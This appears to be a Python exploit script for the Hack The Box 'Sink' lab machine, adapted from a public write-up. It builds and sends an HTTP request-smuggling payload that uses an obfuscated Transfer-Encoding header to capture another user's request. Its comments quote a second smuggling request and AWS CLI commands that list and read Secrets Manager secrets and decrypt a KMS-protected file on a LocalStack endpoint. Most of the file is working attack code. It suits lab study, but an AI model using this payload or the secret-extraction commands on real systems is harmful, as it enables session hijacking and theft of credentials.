#!/usr/bin/python3
##
############
##
## 0xdf httb sink modified
## https://0xdf.gitlab.io/2021/09/18/htb-sink.html
## https://portswigger.net/web-security/request-smuggling
## https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling
##
###################

import socket

host = "10.10.10.222"
port = 6969

body = f"""0

POST /notes HTTP/1.1
Host: {host}:{port}
Referer: http://10.10.10.225:5000/notes
Content-Type: text/plain
Content-Length: 50 
Cookie: session=eyJlbWFpbCI6IjB4ZGZAc2luay5odGIifQ.YAri4g.PYo0eJg0oYeW_8_k5QKNi2R78QM

note=""".replace('\n','\r\n')

header = f"""GET / HTTP/1.1
Host: {host}:{port}
Content-Length: {len(body)}
Transfer-Encoding: \x0bchunked

""".replace('\n','\r\n')

request = (header + body).encode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.send(request)
    
    
##############
##
##
##        (c/o xct) 
## Example Smuggling Request
##
## POST /comment HTTP/1.1
## Host: sink.htb:5000
## Cookie: session=eyJlbWFpbCI6InhjdEBleGFtcGxlLmNvbSJ9.YUMdpw.xLkQCSRKf7EfIxXMMBDR8i8Pi9M
## Content-Type: application/x-www-form-urlencoded
## Content-Length: 215
## Transfer-Encoding:chunked
## POST /comment HTTP/1.1
## Host: sink.htb:5000
## Content-Type: application/x-www-form-urlencoded
## ontent-Length: 290
## Cookie: session=eyJlbWFpbCI6InhjdEBleGFtcGxlLmNvbSJ9.YUMdpw.xLkQCSRKf7EfIxXMMBDR8i8Pi9M
## msg=
#########################
##
##
## AWS CLI Commands

# aws --endpoint-url=http://127.0.0.1:4566 kms list-keys
# aws --endpoint-url=http://127.0.0.1:4566 secretsmanager list-secrets
# aws --endpoint-url=http://127.0.0.1:4566 secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-yVNfw"
# aws kms decrypt --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc --query Plaintext --output text --endpoint-url=http://127.0.0.1:4566 --key-id=804125db-bdf1-465a-a058-07fc87c0fad0 --encryption-algorithm RSAES_OAEP_SHA_256

#########################
##
##
